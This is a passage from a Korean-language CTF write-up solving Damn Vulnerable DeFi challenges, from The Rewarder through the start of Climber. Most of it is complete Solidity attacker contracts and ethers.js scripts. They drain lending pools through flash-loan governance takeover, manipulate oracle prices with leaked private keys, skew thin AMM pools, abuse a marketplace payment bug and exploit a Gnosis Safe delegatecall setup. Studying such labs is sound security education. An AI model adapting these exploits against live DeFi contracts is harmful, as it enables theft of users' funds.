payable _attacker) { lenderPool = _lenderPool; //liquidityToken = _liquidityToken;  liquidityToken = _liquidityToken; rewarderPool = _rewarderPool; rewardToken = _rewardToken; attacker = _attacker; } function receiveFlashLoan(uint256 amount) external { require(msg.sender == lenderPool, \u0026#34;Sender must be pool\u0026#34;); // Flashloan Borrow : Receive liquidity token(DTV) from LenderPool(flashloan)  uint256 amountToBeRepaid = amount; IDamnValuableToken(liquidityToken).approve(rewarderPool, amountToBeRepaid); IRewarderPool(rewarderPool).deposit(amountToBeRepaid); IRewarderPool(rewarderPool).withdraw(amountToBeRepaid); // Flashloan Repayment : Pay back to LenderPool(flashloan)  IDamnValuableToken(liquidityToken).transfer(lenderPool, amountToBeRepaid); } function execFlashLoans(uint256 amount) external { IFlashLoanerPool(lenderPool).flashLoan(amount); IRewardToken(rewardToken).transfer( msg.sender, IRewardToken(rewardToken).balanceOf(address(this)) ); } receive () external payable {} } the-rewarder.challenge.js\nconst FlashLoanTheRewarder = await ethers.getContractFactory(\u0026#39;FlashLoanTheRewarder\u0026#39;, attacker); this.attackerContract = await FlashLoanTheRewarder.deploy(this.flashLoanPool.address, this.liquidityToken.address, this.rewardToken.address, this.rewarderPool.address, attacker.address); // Next Reward Round! await ethers.provider.send(\u0026#34;evm_increaseTime\u0026#34;, [5 * 24 * 60 * 60]); // 5 days  await this.attackerContract.execFlashLoans(ethers.utils.parseEther(\u0026#39;1000000\u0026#39;)); //console.log(await this.attackerContract.check()); console.log(await this.rewarderPool.roundNumber()); // for (let i = 0; i \u0026lt; users.length; i++) { // console.log(await this.rewardToken.balanceOf(users[i].address)); // } console.log(await this.rewardToken.balanceOf(attacker.address));  # 6. Selfie Summary Flash Loan을 제공하며 거버넌스 메커니즘을 기반으로 제어가 가능한 150만개의 DTV 토큰을 보유하고 있는 Lending Pool이 있다.\n공격자는 0개의 DTV 토큰을 가지고 있으며, 해당 Lending Pool로부터 모든 토큰을 가져오는 것이 목표이다.\n// SelfiePool.sol ... /** * @notice 컨트랙트(펀드)에 있는 모든 토큰 잔액을 해당 주소로 전송 (governance만 해당 함수 호출 가능) * @param receiver 모든 토큰 잔액을 전송할 대상 주소 */ function drainAllFunds(address receiver) external onlyGovernance { uint256 amount = token.balanceOf(address(this)); token.transfer(receiver, amount); emit FundsDrained(receiver, amount); } ... Flash Loan 컨트랙트에는 거버넌스만이 실행할 수 있으며 지정된 계정으로 모든 토큰을 보내는 drainAllFunds() 함수를 제공하고 있다.\n// SimpleGovernance.sol ... /** * @notice 거버넌스 큐에 실행할 작업을 적재 * @param receiver 작업을 실행할 컨트랙트의 주소 * @param data 작업에 사용할 calldata(함수 이름, 인자 등) * @return 큐에 적재된 작업의 식별자(actionId) */ function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256) { require(_hasEnoughVotes(msg.sender), \u0026#34;Not enough votes to propose an action\u0026#34;); // 큐에 작업을 추가하기 위해서는 전체 토큰 발행량의 절반 이상을 가지고 있어야 함  require(receiver != address(this), \u0026#34;Cannot queue actions that affect Governance\u0026#34;); // governance 컨트랙트 내 함수는 실행하지 못함  uint256 actionId = actionCounter; GovernanceAction storage actionToQueue = actions[actionId]; actionToQueue.receiver = receiver; actionToQueue.weiAmount = weiAmount; actionToQueue.data = data; actionToQueue.proposedAt = block.timestamp; // 작업이 큐에 적재된 시간(timestamp)  actionCounter++; emit ActionQueued(actionId, msg.sender); return actionId; } ... /** * @notice 거버넌스 큐에 적재된 작업 실행 * @param actionId 실행할 작업의 식별자(actionId) */ function executeAction(uint256 actionId) external payable { // _canBeExecuted()에 의해 (1) 아직 실행된 적이 없고(executedAt==0), (2) 큐에 적재된지 2일 이상이 지난 작업만 실행 가능  require(_canBeExecuted(actionId), \u0026#34;Cannot execute this action\u0026#34;); GovernanceAction storage actionToExecute = actions[actionId]; actionToExecute.executedAt = block.timestamp; actionToExecute.receiver.functionCallWithValue( actionToExecute.data, // address target  actionToExecute.weiAmount // bytes memory data  ); emit ActionExecuted(actionId, msg.sender); } 해당 거버넌스 메커니즘은 총 200만개가 발행된 DTV 토큰 중에서, 100만개를 초과한 토큰을 가진 계정만이 Lending Pool을 제어할 수 있는 action을 queue에 삽입할 수 있다.\nFlash Loan으로부터 150만개의 토큰(총 발행량의 과반이 넘는 토큰양)을 대출한 뒤, 거버넌스 큐에 drainAllFunds() 함수를 실행하는 action을 삽입한다.\n이후 queue에 있는 action을 실행하여 Lending Pool의 모든 토큰을 공격자의 계정으로 옮길 수 있다.\nExploit attacker-contracts/FlashLoanSelfie.sol\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import \u0026#34;@openzeppelin/contracts/utils/Address.sol\u0026#34;; interface IDamnValuableToken { function transfer(address recipient, uint256 amount) external; function transferFrom(address sender, address recipient, uint256 amount) external; function approve(address spender, uint256 amount) external; function balanceOf(address account) external returns (uint256); } interface IDamnValuableTokenSnapshot { function snapshot() external returns (uint256); function getBalanceAtLastSnapshot(address account) external view returns (uint256); function getTotalSupplyAtLastSnapshot() external view returns (uint256); } interface ISimpleGovernance { function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256); function executeAction(uint256 actionId) external payable; function getActionDelay() external view returns (uint256); } interface ISelfiePool { function flashLoan(uint256 borrowAmount) external; function drainAllFunds(address receiver) external; } contract FlashLoanSelfie { using Address for address payable; address payable public attacker; address payable public token; address payable public governance; address payable public lenderPool; uint256 public actId; constructor (address payable _attacker, address payable _token, address payable _governance, address payable _lenderPool) { attacker = _attacker; token = _token; governance = _governance; lenderPool = _lenderPool; } function receiveTokens(address _tokenAddress, uint256 _borrowAmount) external { // Flash loan borrow  IDamnValuableTokenSnapshot(_tokenAddress).snapshot(); actId = ISimpleGovernance(governance).queueAction(lenderPool, abi.encodeWithSignature(\u0026#34;drainAllFunds(address)\u0026#34;, attacker), 1); // Flash loan repayment : pay back to flash loan  IDamnValuableToken(_tokenAddress).transfer(lenderPool, _borrowAmount); } function executeFlashLoans(uint256 _amount) external { ISelfiePool(lenderPool).flashLoan(_amount); } receive() external payable {} } selfie.challenge.js\nconst FlashLoanSelfieFactory = await ethers.getContractFactory(\u0026#39;FlashLoanSelfie\u0026#39;, attacker); this.exploit = await FlashLoanSelfieFactory.deploy(attacker.address, this.token.address, this.governance.address, this.pool.address); await this.exploit.connect(attacker).executeFlashLoans(ethers.utils.parseEther(\u0026#34;1500000\u0026#34;)); await ethers.provider.send(\u0026#34;evm_increaseTime\u0026#34;, [2 * 24 * 60 * 60]); // 2 days  await this.governance.executeAction(0);  # 7. Compromised Summary \u0026ldquo;DVNFT\u0026quot;라는 NFT를 거래하는 마켓이 있으며, 해당 NFT는 개당 999 ETH에 판매되고 있다.\nNFT의 판매 가격은 3개의 Trusted Reporter가 설정한 가격의 median 값을 사용하고 있다.\nNFT 마켓은 9990 ETH, 공격자는 0.1 ETH를 보유하고 있는 상황에서 마켓이 가진 모든 ETH를 가져오는 것이 목표이다.\n해당 마켓으로부터 다음과 같은 on-chain 데이터가 유출되었다.\nHTTP/2 200 OK content-type: text/html content-language: en vary: Accept-Encoding server: cloudflare 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35 4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34 유출된 두개의 데이터는 2개의 Trusted Reporter 계정의 개인키(Private Key)이므로, 해당 개인키를 이용해 NFT 마켓의 NFT 가격을 낮게 설정하는 트랜잭션을 송신함으로써 시세 조작이 가능하다.\n// TrustfulOracle.sol ... function _computeMedianPrice(string memory symbol) private view returns (uint256) { uint256[] memory prices = _sort(getAllPricesForSymbol(symbol)); // calculate median price if (prices.length % 2 == 0) { uint256 leftPrice = prices[(prices.length / 2) - 1]; uint256 rightPrice = prices[prices.length / 2]; return (leftPrice + rightPrice) / 2; } else { return prices[prices.length / 2]; } } ... Trusted Reporter가 설정한 가격이 홀수인 경우 prices[prices.length / 2]와 같이 median price를 계산한다.\n공격자는 3개중 2개의 개인키를 가지고 있기 때문에, 원하는대로 median price를 조작하는 것이 가능하다.\nExploit compromised.challenge.js\n// load wallet/signer from Private Key  // Leaked Hex Data -\u0026gt; Base64Decode // 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35 let privKey1 = \u0026#34;0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9\u0026#34;; var wallet1 = new ethers.Wallet(privKey1, ethers.provider); // 4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34 let privKey2 = \u0026#34;0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48\u0026#34;; var wallet2 = new ethers.Wallet(privKey2, ethers.provider); // Makret Manipulation (Price to low) await this.oracle.connect(wallet1).postPrice(\u0026#34;DVNFT\u0026#34;, ethers.utils.parseEther(\u0026#34;0.01\u0026#34;)); await this.oracle.connect(wallet2).postPrice(\u0026#34;DVNFT\u0026#34;, ethers.utils.parseEther(\u0026#34;0.01\u0026#34;)); // buy await this.exchange.connect(attacker).buyOne({value: ethers.utils.parseEther(\u0026#34;0.01\u0026#34;)}); // Makret Manipulation (Price to high) await this.oracle.connect(wallet1).postPrice(\u0026#34;DVNFT\u0026#34;, ethers.utils.parseEther(\u0026#34;9990.01\u0026#34;)); await this.oracle.connect(wallet2).postPrice(\u0026#34;DVNFT\u0026#34;, ethers.utils.parseEther(\u0026#34;9990.01\u0026#34;)); console.log(await this.oracle.getAllPricesForSymbol(\u0026#34;DVNFT\u0026#34;)); console.log(await this.oracle.getMedianPrice(\u0026#34;DVNFT\u0026#34;)); // approve \u0026amp; sell await this.nftToken.connect(attacker).approve(this.exchange.address, 0); await this.exchange.connect(attacker).sellOne(0); // price recovery await this.oracle.connect(wallet1).postPrice(\u0026#34;DVNFT\u0026#34;, ethers.utils.parseEther(\u0026#34;999\u0026#34;)); await this.oracle.connect(wallet2).postPrice(\u0026#34;DVNFT\u0026#34;, ethers.utils.parseEther(\u0026#34;999\u0026#34;));  # 8. Puppet Summary 100,000 DTV 토큰을 보유한 Lending Pool로부터 모든 토큰을 가져오는 것이 목표이며, 공격자는 25 ETH / 1,000 DTV를 가지고 있는 상태로 시작한다.\nUniswap V1을 기반으로 구축된 Puppet Pool DEX(DEcentralized eXchange)가 있으며, 10 DTV / 10 ETH 의 초기 유동성이 공급되고 있다.\n100,000 DTV 토큰을 보유하고 담보 대출을 해주는 Lending Pool이 있으며, Uniswap V1의 AMM(CPMM, Constants Product Market Maker)을 Price Oracle로 사용하고 있다.\n 정확히는 Uniswap V1에서 받아오는 Price Oracle의 x2 가격을 담보로 설정하여 DTV 토큰을 대출해준다. 초기 Uniswap V1의 유동성은 10 DTV / 10 ETH이기 때문에, CPMM에 의해 Price Oracle은 1이며, Lending Pool로부터 1 DTV를 대출하려면 2 ETH를 담보로 전송해야 한다.  공격자는 자신이 가진 DTV를 Uniswap V1 Pool에 있는 ETH와 Swap하여 Price Oracle 즉 DTV 토큰의 상대적인 가격을 임의로 낮출 수 있다. (1 DTV 당 대출에 필요한 ETH 가격이 낮아짐)\n CPMM 기반 Uniswap V1 Pool에 충분한 유동성이 공급되지 않는 경우, 토큰의 가격을 조작할 수 있다. (안정적인 가격 유지를 위해 충분한 유동성이 공급되어야 한다.)\n Exploit puppet.challenge.js\nawait this.token.connect(attacker).approve(this.uniswapExchange.address, ethers.utils.parseEther(\u0026#34;990\u0026#34;)); await this.uniswapExchange.connect(attacker).tokenToEthTransferInput(ethers.utils.parseEther(\u0026#34;990\u0026#34;), ethers.utils.parseEther(\u0026#34;1\u0026#34;), (await ethers.provider.getBlock(\u0026#39;latest\u0026#39;)).timestamp * 2, attacker.address); let priceOracle = ethers.BigNumber.from(await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther(\u0026#34;1\u0026#34;))); let numOfEths = priceOracle.mul(100000).add(1); await this.lendingPool.connect(attacker).borrow(ethers.utils.parseEther(\u0026#34;100000\u0026#34;), {value: numOfEths});  # 9. Puppet v2 Summary Puppet과 동일하게 적은 유동성에 따른 토큰 가격 조작에 대한 위험이 있으며, Uniswap V2 업데이트에 따른 인터페이스(Wrapped ETH, Swap Router Path 등)만 맞춰주면 된다.\nExploit puppet-v2.challenge.js\n// Swap DTV -\u0026gt; ETH let stamp = (await ethers.provider.getBlock(\u0026#39;latest\u0026#39;)).timestamp * 2; await this.token.connect(attacker).approve(this.uniswapRouter.address, ethers.utils.parseEther(\u0026#34;9999\u0026#34;)); await this.uniswapRouter.connect(attacker).swapExactTokensForETH(ethers.utils.parseEther(\u0026#34;9999\u0026#34;), ethers.utils.parseEther(\u0026#34;1\u0026#34;), [this.token.address, this.weth.address], attacker.address, stamp); // lending! // attacker eth -\u0026gt; weth convert let priceOracle = ethers.BigNumber.from(await this.lendingPool.calculateDepositOfWETHRequired(ethers.utils.parseEther(\u0026#34;1\u0026#34;))); let numOfWeths = priceOracle.mul(1000001) await this.weth.connect(attacker).deposit({value: numOfWeths}); await this.weth.connect(attacker).approve(this.lendingPool.address, numOfWeths); // steal! await this.lendingPool.connect(attacker).borrow(ethers.utils.parseEther(\u0026#34;1000000\u0026#34;));  # 10. Free rider Summary DVNFT를 거래할 수 있는 마켓이 있고, 해당 마켓에는 초기에 발행된 6개의 NFT가 각각 15 ETH에 판매되고 있다.\n해당 마켓에 있는 모든 NFT가 drain될 수 있는 취약점이 있는데, buyer는 방법을 몰라 공격자에게 의뢰한 상황이다.\n공격자는 0.5 ETH로 시작하며, 해당 마켓으로부터 6개의 NFT 토큰을 빼와 buyer에게 전달하면 대가로 45 ETH를 받을 수 있다.\nFreeRiderNFTMArketplace.sol의 _buyOne()에 취약점이 존재한다.\nNFT를 15 ETH에 구매한 buyer에게 토큰을 전송한 뒤 원래 owner인 seller에게 15 ETH의 금액을 전송해야하는데, 다음 코드처럼 새로운 owner인 buyer에게 금액을 전송하게 된다.\n-\u0026gt; 공격자는 15 ETH 만 있으면 마켓내 모든 NFT 토큰을 구매할 수 있다.\n// FreeRiderNFTMArketplace.sol ... function _buyOne(uint256 tokenId) private { uint256 priceToPay = offers[tokenId]; require(priceToPay \u0026gt; 0, \u0026#34;Token is not being offered\u0026#34;); require(msg.value \u0026gt;= priceToPay, \u0026#34;Amount paid is not enough\u0026#34;); amountOfOffers--; // Vulnerability : NFT를 safeTransferFrom(token.ownerOf(tokenId))로 보내면, 해당 NFT 토큰의 owner가 새 buyer로 바뀐다  // 그 이후에 token.ownerOf(tokenId).sendValue() 호출 시 지불금액이 seller가 아닌 buyer에게 다시 돌아감!  // transfer from seller to buyer  token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId); // pay seller  payable(token.ownerOf(tokenId)).sendValue(priceToPay); // vulnerable  emit NFTBought(msg.sender, tokenId, priceToPay); } ... 공격자는 0.5 ETH 밖에 없기 때문에, UniswapV2의 Flash Swap을 이용하여 ETH를 대출하여 마켓내 모든 NFT 토큰을 가져올 수 있다.\n (1) UniswapV2 Flash Swap을 통해 15 ETH 대출 (Borrow) (2) 취약점을 이용하여 마켓내 모든 NFT 토큰 drain (3) UniswapV2 Flash Swap에 15 ETH 상환 (Pay Back) (4) 모든 NFT 토큰을 buyer에게 전송하여, 45 ETH 수령  Exploit attacker-contracts/FlashLoanFreeRider.sol\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import \u0026#34;@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\u0026#34;; interface IUniswapV2Pair { // token0 : weth  // token1 : DTV  function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external; } interface IWETH9 { function balanceOf(address) external returns (uint); function deposit() external payable; function withdraw(uint wad) external; function transfer(address dst, uint wad) external returns (bool); } interface IFreeRiderNFTMarketplace { function buyMany(uint256[] calldata tokenIds) external payable; } interface IERC721 { function safeTransferFrom(address from, address to, uint256 tokenId) external; } contract FlashLoanFreeRider { address uniswapPair; address weth; address payable nftMarketplace; address damnNft; address buyer; uint256[] public tokenIds = [0,1,2,3,4,5]; constructor(address _uniswapPair, address _weth, address payable _nftMarketplace, address _damnNft, address _buyer) { uniswapPair = _uniswapPair; weth = _weth; nftMarketplace = _nftMarketplace; damnNft = _damnNft; buyer = _buyer; } // UniswapV2\u0026#39;s Flash Loan Interface  function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external { IWETH9(weth).withdraw(amount0); // Borrow : received FlashLoan WETH -\u0026gt; ETH  IFreeRiderNFTMarketplace(nftMarketplace).buyMany{value: address(this).balance}(tokenIds); // drain all NFT Token from marketplace  IWETH9(weth).deposit{value: address(this).balance}(); // ETH -\u0026gt; WETH  IWETH9(weth).transfer(uniswapPair, IWETH9(weth).balanceOf(address(this))); // Pay back to FlashLoan  // Send NFT tokens to buyer  for(uint256 i=0 ; i\u0026lt;tokenIds.length ; i++) { IERC721(damnNft).safeTransferFrom(address(this), buyer, i); } } function onERC721Received(address, address, uint256 _tokenId, bytes memory) external returns (bytes4) { return IERC721Receiver.onERC721Received.selector; } function exploit(uint256 _flashLoanAmount) external { bytes memory data = \u0026#34;EXPLOIT\u0026#34;; IUniswapV2Pair(uniswapPair).swap(_flashLoanAmount, 0, address(this), data); } receive() external payable {} } free-rider.challenge.js\n// FreeRiderNFTMarketplace._buyOne()의 취약점으로 인해 15 ETH(NFT 1개당 가격)만 있으면 모든 NFT를 빼내올 수 있다.  // UniswapV2의 FlashLoan 이용! - UniswapV2Pair.sol -\u0026gt; swap() // attacker-contracts/FlashLoanFreeRider.sol  this.exploitContract = await(await ethers.getContractFactory(\u0026#39;FlashLoanFreeRider\u0026#39;, attacker)).deploy( this.uniswapPair.address, this.weth.address, this.marketplace.address, this.nft.address, this.buyerContract.address, ); await this.exploitContract.exploit(ethers.utils.parseEther(\u0026#34;15\u0026#34;));  # 11. Backdoor Summary Gnosis Safe Wallet 레지스트리가 배포되었으며, 해당 레지스트리를 이용하여 지갑을 등록 및 deploy 시 보상으로 10 DTV 토큰을 받을 수 있다.\n해당 레지스트리는 GnosisSafeProxyFactory를 이용하여 Safety Check를 수행한다.\n현재 WalletRegistry에 benficiary로 등록된 사용자는 Alice, Bob, Charile, David 네 명이다.\nWalletRegistry는 네 명의 사용자에게 보상으로 지급할 40 DTV 토큰을 가지고 있으며, 네 사용자가 WalletRegistry를 이용하여 지갑을 생성/배포 시 보상으로 해당 지갑에 토큰(10 DTV)을 받을 수 있다.\n공격자는 해당 WalletRegistry로부터 40 DTV 토큰을 가져오는 것이 목표이다.\n각 사용자의 EOA는 현재 GnosisSafeProxyFactory를 통한 Proxy 컨트랙트 배포 이전에 beneficiary로 등록만 된 상태이다.\nGnosisSafeProxyFactory::createProxyWithCallback()을 통해 지갑이 생성 및 배포되며, 전달된 콜백함수(WalletRegistry::proxyCreated())에 의해 지갑 관련 모듈 세팅이나 보상 토큰 지급 등의 모듈 코드를 실행하게 된다.\n지갑 생성/배포 및 보상 분배 과정\n  (1) GnosisSafe(masterCopy) 및 GnosisSafeProxyFactory(walletFactory) 배포 (실제 환경에서는 이미 mainnet이나 testnet에 배포되어 있음)\n  (2) WalletRegistry 배포\n 생성자(constructor)에 GnosisSafe / GnosisSafeProxyFactory 컨트랙트 주소 전달 두 컨트랙트 주소는 WalletRegistry::proxyCreated()에서 사용    (3) 지갑 배포/생성을 원하는 사용자가 GnosisSafeProxyFactory::createProxyWithCallback() 호출하여 지갑 생성/배포 수행\n 이 때, 보상 수령을 위해 생성 이후 호출할 콜백함수를 WalletRegistry::proxyCreated()로 지정  GnosisSafeProxyFactory.sol\n ... /// @dev Allows to create new proxy contact, execute a message call to the new proxy and call a specified callback within one transaction /// @param _singleton Address of singleton contract. /// @param initializer Payload for message call sent to new proxy contract. /// @param saltNonce Nonce that will be used to generate the salt to calculate the address of the new proxy contract. /// @param callback Callback that will be invoced after the new proxy contract has been successfully deployed and initialized. function createProxyWithCallback( address _singleton, bytes memory initializer, uint256 saltNonce, IProxyCreationCallback callback ) public returns (GnosisSafeProxy proxy) { uint256 saltNonceWithCallback = uint256(keccak256(abi.encodePacked(saltNonce, callback))); proxy = createProxyWithNonce(_singleton, initializer, saltNonceWithCallback); if (address(callback) != address(0)) callback.proxyCreated(proxy, _singleton, initializer, saltNonce); } ...  해당 함수는 새로운 프록시 컨트랙트를 생성하는 용도로 사용되며, 아래와 같은 인자 사용 address _singleton : 싱글턴 컨트랙트의 주소로 GnosisSafe(masterCopy) 사용 bytes memory initializer : 새로 생성되는 프록시 컨트랙트에서 메시지 콜로 실행할 페이로드 전달 uint256 saltNonce : 새로운 프록시 컨트랙트의 주소 생성 시 솔트 값으로 사용 IProxyCreateCallback callback : 새로운 프록시 컨트랙트가 생성 및 배포된 후 실행할 콜백함수    (4) WalletRegistry::proxyCreated()가 개발자가 구현해놓은 콜백함수\n 기존에 등록된 beneficiary 사용자가 GnosisSafeProxyFactory::createProxyWithCallback()를 호출하여 지갑 생성/배포 시에, 10 DTV 토큰을 보상받도록 구현    WalletRegistry.sol\n... function proxyCreated( GnosisSafeProxy proxy, address singleton, bytes calldata initializer, uint256 ) external override { // Make sure we have enough DVT to pay  require(token.balanceOf(address(this)) \u0026gt;= TOKEN_PAYMENT, \u0026#34;Not enough funds to pay\u0026#34;); address payable walletAddress = payable(proxy); // Ensure correct factory and master copy  require(msg.sender == walletFactory, \u0026#34;Caller must be factory\u0026#34;); require(singleton == masterCopy, \u0026#34;Fake mastercopy used\u0026#34;); // Ensure initial calldata was a call to `GnosisSafe::setup`  require(bytes4(initializer[:4]) == GnosisSafe.setup.selector, \u0026#34;Wrong initialization\u0026#34;); // payload : initialzer는 setup() 호출만 가능  // Ensure wallet initialization is the expected  require(GnosisSafe(walletAddress).getThreshold() == MAX_THRESHOLD, \u0026#34;Invalid threshold\u0026#34;); require(GnosisSafe(walletAddress).getOwners().length == MAX_OWNERS, \u0026#34;Invalid number of owners\u0026#34;); // Ensure the owner is a registered beneficiary  address walletOwner = GnosisSafe(walletAddress).getOwners()[0]; require(beneficiaries[walletOwner], \u0026#34;Owner is not registered as beneficiary\u0026#34;); // Remove owner as beneficiary  _removeBeneficiary(walletOwner); // Register the wallet under the owner\u0026#39;s address  wallets[walletOwner] = walletAddress; // Pay tokens to the newly created wallet  token.transfer(walletAddress, TOKEN_PAYMENT); } GnosisSafeProxyFactory::createProxyWithCallback() 호출을 통해 지갑 배포/생성 시, 생성되는 지갑(프록시 컨트랙트)에서 실행할 페이로드를 bytes memory initializer 통해 전달할 수 있으며, 해당 페이로드는 callback 함수인 proxyCreated()에 전달된다.\n이후 proxyCreated() 함수에서는 initializer 데이터를 통해 GnosisSafe::setup() 함수만 호출이 가능하도록 개발되어 있다.\nGnosisSafe.sol\n... /// @dev Setup function sets initial storage of contract. /// @param _owners List of Safe owners. /// @param _threshold Number of required confirmations for a Safe transaction. /// @param to Contract address for optional delegate call. /// @param data Data payload for optional delegate call. /// @param fallbackHandler Handler for fallback calls to this contract /// @param paymentToken Token that should be used for the payment (0 is ETH) /// @param payment Value that should be paid /// @param paymentReceiver Adddress that should receive the payment (or 0 if tx.origin) function setup( address[] calldata _owners, uint256 _threshold, address to, // optional : delegate call 실행할 대상 주소 bytes calldata data, // optional : delegate call로 실행할 데이터 address fallbackHandler, address paymentToken, uint256 payment, address payable paymentReceiver ) external { // setupOwners checks if the Threshold is already set, therefore preventing that this method is called twice setupOwners(_owners, _threshold); if (fallbackHandler != address(0)) internalSetFallbackHandler(fallbackHandler); // As setupOwners can only be called if the contract has not been initialized we don't need a check for setupModules setupModules(to, data); // *** delegate call! if (payment \u0026gt; 0) { // To avoid running into issues with EIP-170 we reuse the handlePayment function (to avoid adjusting code of that has been verified we do not adjust the method itself) // baseGas = 0, gasPrice = 1 and gas = payment =\u0026gt; amount = (payment + 0) * 1 = payment handlePayment(payment, 0, 1, paymentToken, paymentReceiver); } emit SafeSetup(msg.sender, _owners, _threshold, to, fallbackHandler); } ... Exploit GnosisSafe::setup()는 setupModules() 함수를 통해 전달된 call data를 실행하며, delegate call 을 사용하기 때문에 취약점이 발생\n공격자는 기등록된 beneficiary의 EOA를 이용해 GnosisSafeProxyFactory::createProxyWithCallback()를 호출하여 지갑을 생성/배포한다.\n호출 시, initializer는 GnosisSafe::setup()을 실행하며, 인자는 다음과 같이 설정한다.\n address[] calldata _ownsers : beneficiary EOA address to : 공격자 컨트랙트 주소 bytes calldata data : delegate call로 실행될 페이로드이며, 공격자 컨트랙트에 구현된 drainEther()를 호출하도록 구성  호출 시, 콜백함수는 WalletRegistry::proxyCreated()를 사용한다.\nBackdoorExploit.sol\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import \u0026#34;@openzeppelin/contracts/token/ERC20/IERC20.sol\u0026#34;; import \u0026#34;@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol\u0026#34;; import \u0026#34;@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol\u0026#34;; interface IGnosisSafeProxyFactor { function createProxyWithCallback(address _singleton, bytes memory initializer, uint256 saltNonce, IProxyCreationCallback callback) external returns (GnosisSafeProxy proxy); } contract BackdoorExploit { address public proxyFactor; address public walletRegistry; address public gnosisMaster; address payable public dtvToken; constructor(address _proxyFactor, address _walletRegistry, address _gnosisMaster, address payable _dtvToken) { proxyFactor = _proxyFactor; walletRegistry = _walletRegistry; gnosisMaster = _gnosisMaster; dtvToken = _dtvToken; } function drainEther(address spender, address token) external { IERC20(token).approve(spender, 10 ether); } function exploit(address _attacker, address[] memory _users, uint256 amounts) external { for(uint8 i=0 ; i\u0026lt;_users.length ; i++) { address[] memory users = new address[](1); users[0] = _users[i]; // setupModules()\u0026#39;s delegatecall() allows an attacker to use user-defined function drainEther().  bytes memory encodedPayload = abi.encodeWithSignature(\u0026#34;drainEther(address,address)\u0026#34;, address(this), dtvToken); bytes memory initializer = abi.encodeWithSignature(\u0026#34;setup(address[],uint256,address,bytes,address,address,uint256,address)\u0026#34;, users, 1, address(this), encodedPayload, address(0), address(0), 0, address(0)); // when attacker\u0026#39;s proxy contract deployed and initialized, user\u0026#39;s DTV token benefit transfer approved by \u0026#39;setup() -\u0026gt; setupModules() -\u0026gt; delegatecall(drainEther())\u0026#39;  GnosisSafeProxy proxy = IGnosisSafeProxyFactor(proxyFactor).createProxyWithCallback(gnosisMaster, initializer, 0, IProxyCreationCallback(walletRegistry)); // after each user deploys and initalizes the wallet proxy contract, attacker receives ether using transferFrom() : user -\u0026gt; attacker  IERC20(dtvToken).transferFrom(address(proxy), _attacker, amounts); } } receive() external payable {} } backdoor.challenge.js\nthis.exploitContract = await ( await ethers.getContractFactory(\u0026#39;BackdoorExploit\u0026#39;, attacker) ).deploy(this.walletFactory.address, this.walletRegistry.address, this.masterCopy.address, this.token.address); await this.exploitContract.exploit(attacker.address, users, ethers.utils.parseEther(\u0026#34;10\u0026#34;));  # 12. Climber Summary 1000만개의 DTV 토큰을 보호하고 있는 Vault 컨트랙트(금고 역할)가 있으며, 해당 컨트랙트는 EIP-1822 UUPS 패턴에 따라 업그레이드가 가능한(Upgradeable) 형태이다.\nVault 컨트랙트의 현재 owner는 Timelock 컨트랙트이며, owner만이 withdraw()를 통해 아주 제한된 양(1 DTV)의 토큰만 출금이 가능하게 설계되어 있다.\n또한 긴급상황에서 모든 토큰을 빼낼 수 있는 권한을 가진 추가적인 계정(Sweeper)도 있다.\nTimelock 컨트랙트에서 Proposer 권한을 부여받은 계정만이 1시간 후에 실행할 수 있는 작업(Operation)을 schedule()을 통해 등록할 수 있다.\n공격자는 Vault 컨트랙트의 모든 토큰을 가져오는 것이 목표이다.\n// ClimberTimelock.sol ... function getOperationState(bytes32 id) public view returns (OperationState) { Operation memory op = operations[id]; if(op.executed) { return OperationState.Executed; } else if(op.readyAtTimestamp \u0026gt;= block.timestamp) { return OperationState.ReadyForExecution; } else if(op.readyAtTimestamp \u0026gt; 0) { return OperationState.Scheduled; } else { return OperationState.Unknown; } } function getOperationId( address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt ) public pure returns (bytes32) { return keccak256(abi.encode(targets, values, dataElements, salt)); } function schedule( address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt ) external onlyRole(PROPOSER_ROLE) { // only PROPOSER can add operations.  require(targets.length \u0026gt; 0 \u0026amp;\u0026amp; targets.length 